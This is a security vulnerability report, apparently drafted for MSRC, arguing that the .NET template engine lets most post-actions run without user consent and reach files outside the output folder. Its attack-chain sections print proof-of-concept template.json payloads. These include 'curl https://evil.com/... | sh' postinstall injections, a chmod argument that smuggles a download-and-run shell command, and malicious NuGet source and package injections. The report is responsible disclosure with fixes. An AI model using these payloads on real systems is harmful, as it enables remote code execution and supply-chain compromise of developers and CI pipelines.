# Systemic Finding: .NET Template Post-Action Security Model is Fundamentally Broken

## Executive Summary

The .NET template engine's post-action system has a **design-level flaw in its consent model**: the `PostActionDispatcher` only gates consent for `ProcessStartPostActionProcessor` (arbitrary command execution). All other post-action processors — including ones that create/modify files outside the template output directory, execute shell commands, add package references, and modify solution files — run **unconditionally without user consent**. Combined with multiple directory traversal vectors, a malicious template installed from NuGet can silently modify files anywhere on disk, inject malicious code into existing projects, and achieve remote code execution — all triggered by a simple `dotnet new`.

---

## 1. The Consent Model Flaw (PostActionDispatcher.cs)

**File:** `src/Cli/Microsoft.TemplateEngine.Cli/PostActionDispatcher.cs`

The dispatcher's `Process()` method (lines 69-173) has a clear two-branch structure:

```csharp
if (actionProcessor is ProcessStartPostActionProcessor)
{
    // Lines 123-153: Consent checks (AllowRunScripts: No/Yes/Prompt)
    // User is asked whether to run the script
}
else // other post action
{
    // Line 157: NO CONSENT CHECK — runs unconditionally
    result |= ProcessAction(...);
}
```

**Every post-action processor that is not `ProcessStartPostActionProcessor` executes without any form of consent.** The user is never asked, never informed (beyond a generic "Processing post actions" message), and has no mechanism to reject individual actions.

### Complete Post-Action Inventory and Consent Status

| Processor | GUID | Consent Required? | Can Escape outputBasePath? | Severity |
|---|---|---|---|---|
| **ProcessStartPostActionProcessor** | `3A7C4B45-...` | **YES** (only one) | N/A (runs arbitrary commands) | Gated |
| **ChmodPostActionProcessor** (F1) | `cb9a6cf3-...` | **NO** | YES (shell injection) | **Critical — RCE** |
| **AddJsonPropertyPostActionProcessor** (F10) | `695A3659-...` | **NO** | YES (parent traversal + repo root) | **High — file tampering** |
| **DotnetAddPostActionProcessor** | `B17581D1-...` | **NO** | YES (FindFilesAtOrAbovePath) | **High — supply chain** |
| **DotnetSlnPostActionProcessor** | `D396686C-...` | **NO** | YES (FindSolutionFilesAtOrAbovePath) | **High — project injection** |
| **DotnetRestorePostActionProcessor** | `210D431B-...` | **NO** | YES (via primary outputs) | **Medium — amplifier** |
| **InstructionDisplayPostActionProcessor** | `AC1156F7-...` | **NO** | No (display only) | Informational |

**Registration points:**
- `Components.cs` (lines 11-18): ChmodPostActionProcessor, InstructionDisplayPostActionProcessor, ProcessStartPostActionProcessor, AddJsonPropertyPostActionProcessor
- `NewCommandParser.cs` (lines 105-107): DotnetAddPostActionProcessor, DotnetSlnPostActionProcessor, DotnetRestorePostActionProcessor

---

## 2. Detailed Traversal Analysis

### F10: AddJsonPropertyPostActionProcessor — Unbounded Parent Directory Traversal

**File:** `src/Cli/Microsoft.TemplateEngine.Cli/PostActionProcessors/AddJsonPropertyPostActionProcessor.cs`

**Traversal Vector 1: `includeAllParentDirectoriesInSearch`** (lines 106-117)

When set to `"true"`, the `FindFilesInCurrentFolderOrParentFolder` method is called with `maxUpLevels = int.MaxValue`:

```csharp
includeAllParentDirectories ? int.MaxValue : 1,
```

The search method (lines 240-280) walks **up to `int.MaxValue` parent directories** — effectively to the filesystem root — looking for matching JSON files:

```csharp
do {
    string[] filesInDir = fileSystem.EnumerateFileSystemEntries(directory, matchPattern, searchOption).ToArray();
    if (filesInDir.Length > 0) return filesInDir;
    directory = Directory.GetParent(directory)?.FullName;
    numberOfUpLevels++;
} while (directory != null && numberOfUpLevels <= maxUpLevels);
```

There is **no validation** that the found file is within `outputBasePath`.

**Traversal Vector 2: `detectRepositoryRoot`** (lines 42-77)

`GetRootDirectory()` walks up to the filesystem root looking for `.git`, `global.json`, or `*.sln`/`*.slnx` files. When found, this becomes the base for file creation:

```csharp
string newJsonFilePath = Path.Combine(repoRoot ?? outputBasePath, jsonFileName);
environment.Host.FileSystem.WriteAllText(newJsonFilePath, "{}");
```

When `allowFileCreation: true` and `detectRepositoryRoot: true`, the processor will **create new files at the repository root**, which is typically several directories above the template output directory.

**Traversal Vector 3: `includeAllDirectoriesInSearch`** (lines 98-99)

When set to `"true"` (the default!), uses `SearchOption.AllDirectories` which recursively searches all subdirectories. Combined with the parent traversal, this searches the entire directory tree above the output path.

### F12: PostActionProcessorBase.GetTargetFilesPaths — Path.GetFullPath Resolves `..`

**File:** `src/Cli/Microsoft.TemplateEngine.Cli/PostActionProcessors/PostActionProcessorBase.cs`

Lines 88-114:

```csharp
protected static IReadOnlyList<string>? GetTargetFilesPaths(
    IReadOnlyDictionary<string, string> postActionArgs,
    string outputBasePath)
{
    // ...
    IReadOnlyList<string> GetFullPaths(IEnumerable<string> paths)
    {
        var fullPaths = paths
            .Select(p => Path.GetFullPath(p, outputBasePath))  // resolves "../../../etc/target"
            .ToList();
        return fullPaths.AsReadOnly();
    }
}
```

`Path.GetFullPath("../../../etc/target", outputBasePath)` resolves the `..` components and returns an absolute path **outside** `outputBasePath`. There is **zero validation** that the resolved path remains within the output directory.

This method is called by:
- **DotnetAddPostActionProcessor** (`FindExistingTargetFiles`, line 107): uses the traversed path to find project files to modify
- Any processor using `PostActionProcessorBase.GetTargetFilesPaths`

### DotnetAddPostActionProcessor — Unbounded Upward Project Search

**File:** `src/Cli/dotnet/Commands/New/PostActions/DotnetAddPostActionProcessor.cs`

`FindProjFileAtOrAbovePath` (line 23-33) delegates to `FileFindHelpers.FindFilesAtOrAbovePath`:

**File:** `src/TemplateEngine/Microsoft.TemplateEngine.Utils/FileFindHelpers.cs`

```csharp
public static IReadOnlyList<string> FindFilesAtOrAbovePath(IPhysicalFileSystem fileSystem,
    string startPath, string matchPattern, Func<string, bool>? secondaryFilter = null)
{
    string? directory = ...;
    do {
        // Search for *.?proj files
        directory = Directory.GetParent(directory).FullName;  // walks up unbounded
    } while (directory != null);  // no limit — walks to filesystem root
}
```

**No upper bound. No `outputBasePath` containment check.** Finds the first `*.*proj` file in any parent directory and modifies it. A malicious template can add package or project references to **any project file** found above the output directory.

### DotnetSlnPostActionProcessor — Unbounded Upward Solution Search

**File:** `src/Cli/dotnet/Commands/New/PostActions/DotnetSlnPostActionProcessor.cs`

`FindSolutionFilesAtOrAbovePath` (lines 20-47) walks to the filesystem root:

```csharp
while (directory != null) {
    // search for *.sln and *.slnx
    directory = Directory.GetParent(directory)?.FullName;  // unbounded
}
```

Finds and modifies the first `.sln`/`.slnx` file in any ancestor directory. A malicious template can add projects to a solution file **anywhere above the output directory**.

---

## 3. Maximum-Impact Attack Chains

### Chain A: NPM Supply Chain RCE via JSON Property Injection

**Scenario:** Developer runs `dotnet new malicious-template -o ./src/NewProject` in a monorepo that has a `package.json` at the root.

**template.json post-action:**
```json
{
  "actionId": "695A3659-EB40-4FF5-A6A6-C9C4E629FCB0",
  "args": {
    "jsonFileName": "package.json",
    "includeAllParentDirectoriesInSearch": "true",
    "parentPropertyPath": "scripts",
    "newJsonPropertyName": "postinstall",
    "newJsonPropertyValue": "curl https://evil.com/payload.sh | sh",
    "allowPathCreation": "true"
  },
  "continueOnError": true,
  "description": "Configure project settings"
}
```

**Result:** The `package.json` at the repository root (found via parent traversal) is modified. The `scripts.postinstall` property is injected. Next time **any developer** runs `npm install` in that repo, arbitrary code executes. If this is committed, every CI/CD pipeline and every developer clone is compromised.

**Severity:** Remote Code Execution via supply chain poisoning. Affects all contributors to the repository.

### Chain B: .NET Configuration Poisoning via appsettings.json

**template.json post-action:**
```json
{
  "actionId": "695A3659-EB40-4FF5-A6A6-C9C4E629FCB0",
  "args": {
    "jsonFileName": "appsettings.json",
    "includeAllParentDirectoriesInSearch": "true",
    "parentPropertyPath": "ConnectionStrings",
    "newJsonPropertyName": "Default",
    "newJsonPropertyValue": "Server=attacker.com;Database=exfil;User=sa;Password=stolen",
    "allowPathCreation": "true"
  }
}
```

**Result:** Modifies an existing `appsettings.json` in a parent project. On next application startup, the application connects to the attacker's database server, leaking credentials via the connection handshake, or enabling SSRF/data exfiltration.

### Chain C: NuGet Supply Chain Attack via Package Reference Injection

**Scenario:** Developer runs template inside an existing solution directory.

**template.json post-action:**
```json
{
  "actionId": "B17581D1-C5C9-4489-8F0A-004BE667B814",
  "args": {
    "referenceType": "package",
    "reference": "Malicious.Package",
    "version": "1.0.0"
  }
}
```

**Result:** `DotnetAddPostActionProcessor.FindProjFileAtOrAbovePath` walks upward unboundedly, finds a `.csproj` file in a parent directory (belonging to an **unrelated project**), and adds a malicious NuGet package reference to it. The next `dotnet restore` or `dotnet build` (triggered automatically by the `DotnetRestorePostActionProcessor`, which also runs without consent) downloads and builds the malicious package.

NuGet packages can contain arbitrary MSBuild targets that execute during build, achieving **RCE during `dotnet build`** of the victim project.

### Chain D: Solution File Manipulation

**template.json post-action:**
```json
{
  "actionId": "D396686C-DE0E-4DE6-906D-291CD29FC5DE",
  "args": {
    "primaryOutputIndexes": "0"
  }
}
```

**Result:** `DotnetSlnPostActionProcessor.FindSolutionFilesAtOrAbovePath` walks to the filesystem root, finds a `.sln` file, and adds the template's project to it. This can:
- Inject a malicious project into a production solution
- Cause the malicious project's build targets to run when the solution is built
- Modify the build graph to include attacker-controlled code

### Chain E: Combined Maximum Damage (F1 + F10 + F12)

A single `template.json` can chain **all** of these without consent:

```json
{
  "postActions": [
    {
      "description": "Configure project dependencies",
      "actionId": "695A3659-EB40-4FF5-A6A6-C9C4E629FCB0",
      "args": {
        "jsonFileName": "package.json",
        "includeAllParentDirectoriesInSearch": "true",
        "parentPropertyPath": "scripts",
        "newJsonPropertyName": "postinstall",
        "newJsonPropertyValue": "curl https://evil.com/s.sh|sh",
        "allowPathCreation": "true"
      },
      "continueOnError": true
    },
    {
      "description": "Configure NuGet settings",
      "actionId": "695A3659-EB40-4FF5-A6A6-C9C4E629FCB0",
      "args": {
        "jsonFileName": "nuget.config",
        "includeAllParentDirectoriesInSearch": "true",
        "detectRepositoryRoot": "true",
        "allowFileCreation": "true",
        "newJsonPropertyName": "packageSources",
        "newJsonPropertyValue": "{\"add\": {\"key\": \"malicious\", \"value\": \"https://evil.com/nuget/v3/index.json\"}}",
        "allowPathCreation": "true"
      },
      "continueOnError": true
    },
    {
      "description": "Set file permissions",
      "actionId": "cb9a6cf3-4f5c-4860-b9d2-03a574959774",
      "args": {
        "+x $(curl https://evil.com/p.sh -o /tmp/p.sh && bash /tmp/p.sh) #": ["dummy.sh"]
      },
      "continueOnError": true
    },
    {
      "description": "Add required packages",
      "actionId": "B17581D1-C5C9-4489-8F0A-004BE667B814",
      "args": {
        "referenceType": "package",
        "reference": "Malicious.BuildTargets",
        "version": "1.0.0"
      },
      "continueOnError": true
    },
    {
      "description": "Add to solution",
      "actionId": "D396686C-DE0E-4DE6-906D-291CD29FC5DE",
      "args": {
        "primaryOutputIndexes": "0"
      },
      "continueOnError": true
    }
  ]
}
```

**A single `dotnet new malicious-template` silently:**
1. Injects `postinstall` RCE into the repo's `package.json` (Chain A)
2. Creates/modifies `nuget.config` at repo root to add a malicious package source (F10 file creation)
3. Executes arbitrary shell commands via chmod injection (F1 — immediate RCE)
4. Adds a malicious NuGet package to a project file above the output directory (Chain C)
5. Adds the malicious project to the solution file above the output directory (Chain D)

**The user sees:** "Processing post actions" and no consent prompt whatsoever.

---

## 4. Systemic Argument

### The Design Flaw

The template post-action security model is built on a **false assumption**: that only `ProcessStartPostActionProcessor` (arbitrary command execution) is dangerous enough to require consent. This assumption is wrong for multiple reasons:

1. **ChmodPostActionProcessor IS command execution.** It calls `/bin/sh -c "chmod ..."` with template-controlled arguments that are not sanitized, making it equivalent to `ProcessStartPostActionProcessor` but without consent gating. This is not a theoretical risk — it is trivially exploitable shell injection.

2. **File modification outside the output directory is equivalent to code execution.** The ability to modify `package.json`, `.csproj`, `nuget.config`, or `.sln` files in parent directories enables supply chain attacks that achieve RCE on the next build/install cycle.

3. **The traversal is unbounded by design.** Multiple processors use `FindFilesAtOrAbovePath`, `FindSolutionFilesAtOrAbovePath`, and `FindFilesInCurrentFolderOrParentFolder` with no upper boundary — they walk to the filesystem root. The `GetTargetFilesPaths` method resolves `..` via `Path.GetFullPath` without containment validation.

4. **Templates are installed from untrusted sources.** `dotnet new install` pulls template packages from NuGet.org, where any authenticated user can publish. The consent model should assume templates are untrusted — but only one of seven processors enforces this.

### What Should Happen

Every post-action processor should:
- Require explicit user consent before execution (like `ProcessStartPostActionProcessor`)
- Validate that all file operations remain within `outputBasePath`
- Reject path traversal sequences (`..`) in template-controlled path arguments
- Log all file modifications with full paths for auditability

### What Actually Happens

Only `ProcessStartPostActionProcessor` requires consent. The other six processors:
- Execute silently
- Can modify files outside `outputBasePath`
- Accept attacker-controlled paths without validation
- In one case (`ChmodPostActionProcessor`), execute arbitrary shell commands

---

## 5. MSRC Submission Narrative

### Title
**Systemic Security Model Bypass in .NET Template Engine Post-Action Processing — Consent Bypass, Directory Traversal, and Silent RCE**

### Summary

The .NET SDK template engine (`dotnet new`) has a fundamental flaw in its post-action security model. While the `PostActionDispatcher` correctly gates user consent for `ProcessStartPostActionProcessor` (the "run script" action), **all other post-action processors execute without any consent or containment**. This affects six of seven registered post-action processors.

Three compounding issues make this exploitable for remote code execution:

1. **F1 (ChmodPostActionProcessor): Immediate RCE without consent.** The chmod processor invokes `/bin/sh -c "chmod {key} {value}"` where both `key` and `value` are template-controlled strings with no sanitization. This is shell injection that achieves arbitrary command execution. Unlike `ProcessStartPostActionProcessor`, it bypasses the consent check entirely because the dispatcher only checks `is ProcessStartPostActionProcessor` — and `ChmodPostActionProcessor` is a different type.

2. **F10 (AddJsonPropertyPostActionProcessor): Unbounded directory traversal with file creation/modification.** With `includeAllParentDirectoriesInSearch: true`, the processor searches up to `int.MaxValue` parent directories for JSON files to modify. With `detectRepositoryRoot: true` and `allowFileCreation: true`, it creates files at the detected repository root. A malicious template can modify any JSON file (`package.json`, `appsettings.json`, `nuget.config`, `tsconfig.json`) found in any ancestor directory, or create new ones at the repository root. No consent is requested.

3. **F12 (PostActionProcessorBase.GetTargetFilesPaths + upward search helpers): General path traversal.** `GetTargetFilesPaths` resolves `..` via `Path.GetFullPath` without validating the result stays within `outputBasePath`. `FileFindHelpers.FindFilesAtOrAbovePath` walks to the filesystem root without bound. `DotnetSlnPostActionProcessor.FindSolutionFilesAtOrAbovePath` does the same. These enable `DotnetAddPostActionProcessor` to add malicious package references to project files outside the template output, and `DotnetSlnPostActionProcessor` to inject projects into solution files found anywhere above.

### Attack Scenario

A malicious template published to NuGet.org is installed by a developer (`dotnet new install MaliciousTemplate`). When used (`dotnet new malicious -o ./src/NewProject`), the template's `postActions` silently:

1. Execute arbitrary shell commands via chmod injection (immediate RCE)
2. Inject `scripts.postinstall` into the repository's `package.json` (persistent RCE on `npm install`)
3. Add a malicious NuGet package reference to a `.csproj` found in parent directories (RCE on `dotnet build`)
4. Add the malicious project to the nearest `.sln` file (build graph poisoning)

The user sees "Processing post actions" and is never prompted for consent for any of these operations.

### Impact

- **Immediate RCE** via ChmodPostActionProcessor shell injection (Linux/macOS)
- **Persistent supply chain RCE** via package.json/nuget.config/csproj poisoning
- **Cross-project contamination** — modifications target files outside the template's output directory
- **CI/CD compromise** — injected build scripts execute in every subsequent build
- **Lateral movement** — if the modified repository is shared (e.g., via git), all contributors and automated systems are compromised

### Affected Versions

All versions of the .NET SDK that include the template engine post-action system. The consent-bypass design has been present since the post-action architecture was introduced.

### Root Cause

`PostActionDispatcher.Process()` uses a type check (`actionProcessor is ProcessStartPostActionProcessor`) to determine whether consent is needed. All other processor types fall through to unconditional execution. This is a **security-relevant design flaw** — the consent model was designed around one threat (arbitrary process execution) while ignoring equivalent threats from file manipulation and shell injection in other processors.

### Recommended Fix

1. **Immediate:** Gate ChmodPostActionProcessor behind the same consent check as ProcessStartPostActionProcessor (it literally executes `/bin/sh`).
2. **Short-term:** Add `outputBasePath` containment validation to `GetTargetFilesPaths`, `GetTargetForSource`, `FindFilesAtOrAbovePath`, `FindSolutionFilesAtOrAbovePath`, and `FindFilesInCurrentFolderOrParentFolder`. Reject any resolved path that is not a descendant of `outputBasePath`.
3. **Medium-term:** Redesign the consent model. All post-action processors that modify the filesystem or invoke external processes should require explicit user consent. The dispatcher should check a capability/risk enum on each processor rather than checking for a single concrete type.
4. **Long-term:** Consider a sandbox model where post-actions operate within a restricted view of the filesystem scoped to the output directory.
